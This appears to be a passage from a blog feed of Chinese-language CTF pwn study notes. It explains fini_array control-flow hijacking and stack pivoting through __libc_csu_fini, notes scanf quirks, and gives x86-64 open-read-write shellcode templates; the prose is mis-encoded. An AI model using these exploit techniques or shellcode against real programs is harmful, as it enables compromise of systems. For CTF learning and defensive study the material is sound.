class="hljs-built_in">rax</span>,<span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402be3</span> &lt;__libc_csu_fini+<span class="hljs-number">19</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x402be7</span> &lt;__libc_csu_fini+<span class="hljs-number">23</span>&gt;:<span class="hljs-keyword">sar</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x3</span><br>   <span class="hljs-number">0x402beb</span> &lt;__libc_csu_fini+<span class="hljs-number">27</span>&gt;:<span class="hljs-keyword">je</span>     <span class="hljs-number">0x402c06</span> &lt;__libc_csu_fini+<span class="hljs-number">54</span>&gt;<br>   <span class="hljs-number">0x402bed</span> &lt;__libc_csu_fini+<span class="hljs-number">29</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rbx</span>,[<span class="hljs-built_in">rax</span>-<span class="hljs-number">0x1</span>]<br>   <span class="hljs-number">0x402bf1</span> &lt;__libc_csu_fini+<span class="hljs-number">33</span>&gt;:<span class="hljs-keyword">nop</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x0</span>]<br>   <span class="hljs-number">0x402bf8</span> &lt;__libc_csu_fini+<span class="hljs-number">40</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rbx</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x0</span>]<br>   <span class="hljs-number">0x402bfc</span> &lt;__libc_csu_fini+<span class="hljs-number">44</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-number">0x1</span><br>   <span class="hljs-number">0x402c00</span> &lt;__libc_csu_fini+<span class="hljs-number">48</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x402c04</span> &lt;__libc_csu_fini+<span class="hljs-number">52</span>&gt;:<span class="hljs-keyword">jne</span>    <span class="hljs-number">0x402bf8</span> &lt;__libc_csu_fini+<span class="hljs-number">40</span>&gt;<br>   <span class="hljs-number">0x402c06</span> &lt;__libc_csu_fini+<span class="hljs-number">54</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x402c0a</span> &lt;__libc_csu_fini+<span class="hljs-number">58</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0x402c0b</span> &lt;__libc_csu_fini+<span class="hljs-number">59</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402c0c</span> &lt;__libc_csu_fini+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x48f52c</span> &lt;_fini&gt;<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ–¹å¼-æ ˆè¿ç§»"><a href="#åˆ©ç”¨æ–¹å¼-æ ˆè¿ç§»" class="headerlink" title="åˆ©ç”¨æ–¹å¼ - æ ˆè¿ç§»"></a>åˆ©ç”¨æ–¹å¼ - æ ˆè¿ç§»</h3><p>é¦–å…ˆï¼Œçœ‹ä¸‹é¢è¿™æ¡æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x402bd8</span>: lea rbp,[rip+<span class="hljs-number">0xb24d1</span>] # <span class="hljs-number">0x4b50b0</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><code>rbp = 0x4b50b0</code>ï¼Œ<code>0x4b50b0</code>æ˜¯<code>fini_array</code>çš„é¦–åœ°å€</p></blockquote><p>è¿™æ¡æŒ‡ä»¤ç›¸å½“äº<code>lea rbp,[fini_array]</code>ï¼Œå› æ­¤ï¼Œåœ¨è¿™é‡Œé…åˆ<code>gadget</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">leave ; (mov rsp,ebp; pop rbp)<br>ret<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>ä¾¿å¯ä»¥æŠŠ__æ ˆè¿ç§»__åˆ°<code>fini_array</code>ï¼ˆ<code>fini_array</code>å­˜å‚¨çš„å‡½æ•°æŒ‡é’ˆï¼Œå¯èƒ½æœ‰__å†™æƒé™__ï¼‰</p><h3 id="åˆ©ç”¨æ–¹å¼-æ§åˆ¶æµåŠ«æŒ"><a href="#åˆ©ç”¨æ–¹å¼-æ§åˆ¶æµåŠ«æŒ" class="headerlink" title="åˆ©ç”¨æ–¹å¼ - æ§åˆ¶æµåŠ«æŒ"></a>åˆ©ç”¨æ–¹å¼ - æ§åˆ¶æµåŠ«æŒ</h3><p>ä¸‹é¢è¿˜æœ‰ä¸€æ¡<code>call</code>æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x402bf8</span>: call QWORD PTR [rbp+rbx*<span class="hljs-number">8</span>]<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><code>rbp</code>å³ä¸º<code>fini_array</code>ï¼Œå› æ­¤è¿™é‡Œå°†è°ƒç”¨<code>fini_array</code>ä¸­çš„å‡½æ•°</p></blockquote><p>åªè¦ä¿®æ”¹<code>fini_array</code>ä¸­çš„å€¼ï¼Œå°±å¯ä»¥å®ç°__æ§åˆ¶æµçš„è½¬ç§»__å•¦ï¼ˆä¼ è¯´ä¸­çš„<code>fini_array</code>åŠ«æŒï¼‰</p><p>è¿™é‡Œåˆ†æçš„64ä½çš„é™æ€ç¼–è¯‘ç¨‹åºï¼Œå¯è§å…¶ä¸­çš„<code>__libc_csu_fini</code>å‡½æ•°ç®€ç›´å¥½ç”¨çš„ä¸å¾—äº†é¸­ï¼Œæ—¢å¯ä»¥å®Œæˆ__æ ˆè¿ç§»__ï¼Œåˆèƒ½å¤ŸåŠ«æŒ__æ§åˆ¶æµ__</p><blockquote><p>åŠ¨æ€é“¾æ¥çš„ç¨‹åº<code>__libc_csu_fini</code>å¾ˆçŸ­ï¼Œå¹¶æ²¡æœ‰ä¸Šè¿°æŒ‡ä»¤â€¦ä½†æ˜¯ä¹Ÿæœ‰ç±»ä¼¼fini_arrayçš„å‡½æ•°æŒ‡é’ˆ</p></blockquote><h2 id="fini-arrayåˆ†æ"><a href="#fini-arrayåˆ†æ" class="headerlink" title="fini_arrayåˆ†æ"></a>fini_arrayåˆ†æ</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; elfheader <br><span class="hljs-number">0x400200</span> - <span class="hljs-number">0x400224</span>  .note<span class="hljs-number">.</span>gnu<span class="hljs-number">.</span>build-id<br><span class="hljs-number">0x400224</span> - <span class="hljs-number">0x400244</span>  .note<span class="hljs-number">.</span>ABI-tag<br><span class="hljs-number">0x400248</span> - <span class="hljs-number">0x400470</span>  .rela<span class="hljs-number">.</span>plt<br><span class="hljs-number">0x401000</span> - <span class="hljs-number">0x401017</span>  .init<br><span class="hljs-number">0x401018</span> - <span class="hljs-number">0x4010d0</span>  .plt<br><span class="hljs-number">0x4010d0</span> - <span class="hljs-number">0x48d630</span>  .text<br><span class="hljs-number">0x48d630</span> - <span class="hljs-number">0x48f52b</span>  __libc_freeres_fn<br><span class="hljs-number">0x48f52c</span> - <span class="hljs-number">0x48f535</span>  .fini<br><span class="hljs-number">0x490000</span> - <span class="hljs-number">0x4a95dc</span>  .rodata<br><span class="hljs-number">0x4a95dc</span> - <span class="hljs-number">0x4a95dd</span>  .stapsdt<span class="hljs-number">.</span>base<br><span class="hljs-number">0x4a95e0</span> - <span class="hljs-number">0x4b3d00</span>  .eh_frame<br><span class="hljs-number">0x4b3d00</span> - <span class="hljs-number">0x4b3da9</span>  .gcc_except_table<br><span class="hljs-number">0x4b5080</span> - <span class="hljs-number">0x4b50a0</span>  .tdata<br><span class="hljs-number">0x4b50a0</span> - <span class="hljs-number">0x4b50b0</span>  .init_array<br><span class="hljs-number">0x4b50a0</span> - <span class="hljs-number">0x4b50e0</span>  .tbss<br><span class="hljs-number">0x4b50b0</span> - <span class="hljs-number">0x4b50c0</span>  .fini_array<br><span class="hljs-number">0x4b50c0</span> - <span class="hljs-number">0x4b7ef4</span>  .data<span class="hljs-number">.</span><span class="hljs-built_in">rel</span><span class="hljs-number">.</span>ro<br><span class="hljs-number">0x4b7ef8</span> - <span class="hljs-number">0x4b7fe8</span>  .got<br><span class="hljs-number">0x4b8000</span> - <span class="hljs-number">0x4b80d0</span>  .got<span class="hljs-number">.</span>plt<br><span class="hljs-number">0x4b80e0</span> - <span class="hljs-number">0x4b9bf0</span>  .data<br><span class="hljs-number">0x4b9bf0</span> - <span class="hljs-number">0x4b9c38</span>  __libc_subfreeres<br><span class="hljs-number">0x4b9c40</span> - <span class="hljs-number">0x4ba2e8</span>  __libc_IO_vtables<br><span class="hljs-number">0x4ba2e8</span> - <span class="hljs-number">0x4ba2f0</span>  __libc_atexit<br><span class="hljs-number">0x4ba300</span> - <span class="hljs-number">0x4bba78</span>  .bss<br><span class="hljs-number">0x4bba78</span> - <span class="hljs-number">0x4bbaa0</span>  __libc_freeres_ptrs<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>0x4b50b0 - 0x4b50c0</code>å³<code>.fini_array</code>æ•°ç»„ï¼Œå…¶ä¸­å­˜åœ¨ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">2</span>xg <span class="hljs-number">0x4b50b0</span><br><span class="hljs-number">0x4b50b0</span>:<span class="hljs-number">0x0000000000401b10</span><span class="hljs-number">0x0000000000401580</span><br>pwndbg&gt; x/i <span class="hljs-number">0x0000000000401b10</span><br>   <span class="hljs-number">0x401b10</span> &lt;__do_global_dtors_aux&gt;:cmp    BYTE PTR [rip+<span class="hljs-number">0xb87e9</span>],<span class="hljs-number">0x0</span><br>pwndbg&gt; x/i <span class="hljs-number">0x0000000000401580</span><br>   <span class="hljs-number">0x401580</span> &lt;fini&gt;:mov    rax,QWORD PTR [rip+<span class="hljs-number">0xb9b71</span>]<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">array[<span class="hljs-number">0</span>]`-&gt;`__do_global_dtors_aux`<br>`array[<span class="hljs-number">1</span>]`-&gt;`fini<br></code></pre></td></tr></table></figure></blockquote><p>è¿™ä¸¤ä¸ªå‡½æ•°éƒ½ä¼šåœ¨<code>main</code>æ‰§è¡Œå®Œæ¯•åæ‰§è¡Œï¼Œå› æ­¤åªè¦__è¦†ç›–è¿™ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå³å¯å®ç°æ§åˆ¶æµçš„åŠ«æŒ__</p><blockquote><p>æ­¤å¤–ï¼Œé™æ€é“¾æ¥çš„ç¨‹åºä¹Ÿæœ‰<code>PLT</code>è¡¨å’Œ<code>GOT</code>è¡¨ï¼Œä¹Ÿå¯ä»¥è¦†ç›–é€šè¿‡<code>GOT</code>ä¸­çš„å‡½æ•°æŒ‡é’ˆå®ç°æ§åˆ¶æµåŠ«æŒ</p></blockquote><p>ä¸Šè¿°<code>fini_array</code>ä¸­çš„ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆåœ¨<code>__libc_csu_fini</code>ï¼ˆä¸Šæ–‡è¯´çš„é‚£ä½å…„å¼Ÿï¼‰ä¸­è¢«æ‰§è¡Œ</p><p><strong>æ‰§è¡Œçš„é¡ºåºæ˜¯<code>array[1]-&gt;array[0]</code></strong>(åæœ‰è¯¦è§£)</p><h2 id="ä¸€ç§å¥½ç©å„¿çš„åˆ©ç”¨æ–¹å¼"><a href="#ä¸€ç§å¥½ç©å„¿çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="ä¸€ç§å¥½ç©å„¿çš„åˆ©ç”¨æ–¹å¼"></a>ä¸€ç§å¥½ç©å„¿çš„åˆ©ç”¨æ–¹å¼</h2><h3 id="å¾ªç¯å¤§æ³•"><a href="#å¾ªç¯å¤§æ³•" class="headerlink" title="å¾ªç¯å¤§æ³•"></a>å¾ªç¯å¤§æ³•</h3><p>ä¸€ç§æ¯”è¾ƒå¥½ç©å„¿çš„æ“ä½œï¼š</p><ul><li>æŠŠ<code>array[0]</code>çš„å€¼è¦†ç›–ä¸ºé‚£ä½å…„å¼Ÿï¼ˆ<code>__libc_csu_fini</code>å‡½æ•°ï¼‰çš„åœ°å€</li><li>æŠŠ<code>array[1]</code>çš„å€¼è¦†ç›–ä¸ºå¦ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œå°±å«ä»–<code>addrA</code>å§</li></ul><p>äºæ˜¯ï¼Œ<code>main</code>æ‰§è¡Œå®Œæ¯•åæ‰§è¡Œ<code>__libc_csu_fini</code>ï¼Œäºæ˜¯æœ‰æ„æ€çš„æ¥äº†ï¼</p><ul><li><code>__libc_csu_fini</code>å…ˆæ‰§è¡Œä¸€é<code>array[1]:addrA</code>ï¼Œè¿”å›åå†æ‰§è¡Œ<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>å…ˆæ‰§è¡Œä¸€é<code>array[1]:addrA</code>ï¼Œè¿”å›åå†æ‰§è¡Œ<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>å…ˆæ‰§è¡Œä¸€é<code>array[1]:addrA</code>ï¼Œè¿”å›åå†æ‰§è¡Œ<code>array[0]:__libc_csu_fini</code></li><li>â€¦</li></ul><p>çœ‹ï¼è¿èµ·æ¥å•¦~ <code>main</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt; <code>......</code></p>]]></content>
    
    
    <categories>
      
      <category>å‡½æ•°åˆ©ç”¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fini_array</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newstaråˆ·é¢˜ç¬”è®°</title>
    <link href="/2024/10/25/newstar%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/10/25/newstar%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="My-GBC"><a href="#My-GBC" class="headerlink" title="My_GBC!!!!!"></a>My_GBC!!!!!</h2><p>æœ¬é¢˜æ”¶è·ï¼š</p><p>å­¦ä¼šäº†å¾ªç¯ä½ç§»åŠ å¯†ç®—æ³•ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªå¯¹ä¸€ä¸ªå­—èŠ‚çš„æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val , n</span>) :<br>  <span class="hljs-keyword">return</span> ((val &gt;&gt; n) | (val &lt;&lt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xff</span><br></code></pre></td></tr></table></figure><h2 id="ä¸æ€è­°ãªscanf"><a href="#ä¸æ€è­°ãªscanf" class="headerlink" title="ä¸æ€è­°ãªscanf"></a>ä¸æ€è­°ãªscanf</h2><p>æœ¬é¢˜æ”¶è·ï¼š</p><p>scanf<code>æ—¶ä½¿ç”¨çš„å‚æ•°</code>%d</p><p>æ­£å¸¸è¾“å…¥æ—¶ï¼Œè¾“å…¥ä¸ºèŒƒå›´åœ¨ [âˆ’231,232âˆ’1] å†…çš„æ•´æ•°ã€‚</p><p>å¦‚æœè¾“å…¥èŒƒå›´åœ¨ [âˆ’263,263âˆ’1] å†…çš„æ•´æ•°ï¼Œåˆ™ä¼šæˆªæ–­é«˜ä½è¯»å–ï¼Œæ­¤èŒƒå›´æ˜¯ <code>long long int</code> çš„èŒƒå›´ã€‚</p><p>å¦‚æœè¾“å…¥èŒƒå›´åœ¨ <code>long long int</code> èŒƒå›´ä¹‹å¤–ï¼Œåˆ™ç»Ÿä¸€å°†å‚æ•°èµ‹å€¼ä¸º âˆ’1ï¼ˆ0xFFFFFFFFï¼‰</p><p>å¦‚æœè¾“å…¥ä¸ºéæ•°å­—ï¼Œåˆ†ä¸ºä¸‹åˆ—æƒ…å†µï¼š</p><ol><li>å¦‚æœè¾“å…¥ä»…æœ‰ä¸€ä¸ªï¼Œåˆ™è¯¥è¾“å…¥æ— æ•ˆï¼Œè¯¥å€¼ä¸å˜ï¼›</li><li>å¦‚æœè¾“å…¥æœ‰æ•°å­—å‰ç¼€ï¼ˆå¦‚ <code>12345abcd</code>ï¼‰ï¼Œåˆ™ <code>scanf</code> ä»…ä¼šè¯»å–å‰é¢çš„æ•°å­—ï¼Œä»ç¬¬ä¸€ä¸ªéæ•°å­—å¼€å§‹ï¼Œåé¢å…¨éƒ¨èˆå¼ƒï¼ˆ<code>12345</code>ï¼‰ï¼›</li><li>å¦‚æœè¾“å…¥æœ‰å¤šä¸ªä¸”ä½¿ç”¨ä¸€ä¸ª <code>scanf</code> è¯­å¥ï¼ˆå¦‚ <code>scanf(&quot;%d, %d&quot;, &amp;a, &amp;b)</code>ï¼‰ï¼Œè¾“å…¥ç¬¬ä¸€ä¸ªéæ•°å­—åï¼Œåé¢çš„æ‰€æœ‰è¾“å…¥å‡ä¸ºæ— æ•ˆï¼Œå‰é¢çš„è¾“å…¥å¯ä»¥èµ‹å€¼ï¼›</li><li>å¦‚æœè¾“å…¥æœ‰å¤šä¸ªä¸”ä½¿ç”¨å¤šä¸ª <code>scanf</code> è¯­å¥ï¼ˆå«å¾ªç¯ï¼Œå³ä¸€ä¸ª <code>scanf</code> ä¸­ä»…æœ‰ä¸€ä¸ªè¾“å…¥ï¼‰ï¼Œåˆ™è¾“å…¥éæ•°å­—æ—¶ï¼Œå¦‚æœè¾“å…¥çš„ä¸æ˜¯ <code>+</code> æˆ– <code>-</code>ï¼Œåˆ™åé¢ç´§è·Ÿçš„æ‰€æœ‰ <code>scanf</code> å‡è‡ªåŠ¨è·³è¿‡ï¼Œå˜ä¸ºæ— æ•ˆï¼Œä¸èƒ½è¾“å…¥ã€‚å¦‚æœè¾“å…¥çš„ <code>+</code> æˆ– <code>-</code>ï¼Œåˆ™ä¼šè·³è¿‡å½“å‰è¾“å…¥ï¼Œåé¢ä»ç„¶å¯ä»¥è¿›è¡Œè¾“å…¥ã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>newstar_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ‰‹æ“shellcoeåˆçº§å¥¥ä¹‰</title>
    <link href="/2024/10/24/%E6%89%8B%E6%90%93shellcoe%E5%88%9D%E7%BA%A7%E5%A5%A5%E4%B9%89/"/>
    <url>/2024/10/24/%E6%89%8B%E6%90%93shellcoe%E5%88%9D%E7%BA%A7%E5%A5%A5%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>ä¹‹å‰ä¸€ç›´ä¾èµ–pwntoolså·¥å…·ï¼Œç›´æ¥æ²‰æººåœ¨æ¸©æŸ”ä¹¡äº†ï¼Œä½†æ˜¯å­¦åˆ°åè¾¹å‘ç°ä¸ä¼šå†™shellcodeçœŸæ˜¯åŸç½ªå‘€ã€‚æ‰€æœ‰èŠ±äº†ä¸€æ™šä¸Šæ—¶é—´æ€»ç»“äº†è¿™ä¸ªshellcodeåˆçº§å¥¥ä¹‰ï¼Œä¸»è¦æ˜¯ORWæ–¹é¢çš„</p><h2 id="ORWæ¨¡æ¿"><a href="#ORWæ¨¡æ¿" class="headerlink" title="ORWæ¨¡æ¿"></a>ORWæ¨¡æ¿</h2><h3 id="æ¨¡æ¿ä¸€"><a href="#æ¨¡æ¿ä¸€" class="headerlink" title="æ¨¡æ¿ä¸€"></a>æ¨¡æ¿ä¸€</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-comment">; open(&quot;flag&quot;, 0)</span><br> <span class="hljs-number">0</span>:   <span class="hljs-number">68</span> <span class="hljs-number">66</span> 6c <span class="hljs-number">61</span> <span class="hljs-number">67</span>          <span class="hljs-keyword">push</span>   <span class="hljs-number">0x67616c66</span><br> <span class="hljs-number">5</span>:   6a <span class="hljs-number">02</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x2</span><br> <span class="hljs-number">7</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br> <span class="hljs-number">8</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-symbol"> b:</span>   <span class="hljs-number">48</span> <span class="hljs-number">31</span> f6                <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br><span class="hljs-symbol"> e:</span>   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br><br> <span class="hljs-comment">; read(fd, rsp, 0x20)</span><br><span class="hljs-number">10</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>  ##openä»¥åæ–‡ä»¶æè¿°æŒ‡å‘<span class="hljs-built_in">rax</span><br><span class="hljs-number">13</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> c0                <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-number">16</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-number">19</span>:   6a <span class="hljs-number">20</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x20</span><br><span class="hljs-number">1b</span>:   5a                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdx</span><br>1c:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br><br> <span class="hljs-comment">; write(1, rsp, 0x20)</span><br>1e:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br><span class="hljs-number">20</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br><span class="hljs-number">21</span>:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br><span class="hljs-number">23</span>:   5f                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-number">24</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-number">27</span>:   6a <span class="hljs-number">20</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x20</span><br><span class="hljs-number">29</span>:   5a                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdx</span><br>2a:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="æ¨¡æ¿äºŒ-ç›¸å½“äºcat-flag"><a href="#æ¨¡æ¿äºŒ-ç›¸å½“äºcat-flag" class="headerlink" title="æ¨¡æ¿äºŒ(ç›¸å½“äºcat flag)"></a>æ¨¡æ¿äºŒ(ç›¸å½“äºcat flag)</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">/* <span class="hljs-keyword">push</span> b<span class="hljs-string">&#x27;flag\x00&#x27;</span> */<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x67616c66</span><br>/* <span class="hljs-keyword">call</span> open(<span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;O_RDONLY&#x27;</span>) */<br><span class="hljs-keyword">push</span> (<span class="hljs-number">2</span>) /* <span class="hljs-number">2</span> */<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span> /* <span class="hljs-number">0</span> */<br><span class="hljs-keyword">cdq</span> /* <span class="hljs-built_in">rdx</span>=<span class="hljs-number">0</span> */<br><span class="hljs-keyword">syscall</span><br>/* <span class="hljs-keyword">call</span> sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2147483647</span>) */<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10d</span>, <span class="hljs-number">0x7fffffff</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> (<span class="hljs-number">40</span>) /* <span class="hljs-number">0x28</span> */<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">cdq</span> /* <span class="hljs-built_in">rdx</span>=<span class="hljs-number">0</span> */<br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜è®²è§£"><a href="#ä¾‹é¢˜è®²è§£" class="headerlink" title="ä¾‹é¢˜è®²è§£"></a>ä¾‹é¢˜è®²è§£</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/RANDOM">é™„ä»¶ä¸‹è½½</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410241957718.png" alt="mainå‡½æ•°"></p><p>é¦–å…ˆæ˜¯ä¼ªéšæœºæ•°çš„ç»•è¿‡ï¼Œè¿›å…¥æ¼æ´å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410242000871.png" alt="æ¼æ´å‡½æ•°"></p><p>åªæº¢å‡ºäº†0x20ä¸ªå­—èŠ‚æ˜¾ç„¶ä¸å¤Ÿæˆ‘ä»¬ORWï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸€ä¸ªreadè¯»å–ORW</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 